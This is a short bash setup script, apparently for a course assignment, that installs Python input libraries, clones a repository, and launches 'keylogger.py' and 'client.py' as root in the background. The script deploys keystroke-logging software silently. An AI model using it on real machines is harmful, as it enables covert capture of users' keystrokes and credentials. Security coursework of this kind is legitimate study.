#!/bin/bash

cd
#check for pip
#need to impliment
#install pytho
yes | pip install python-xlib
yes | pip install python3-xlib
yes | pip install pynput
#check for git
#need to impliment
#clone
git clone https://github.com/DericM/COMP8506_ASN04
#change folder
cd COMP8506_ASN04
#run
sudo python3 keylogger.py &
sudo python3 client.py &



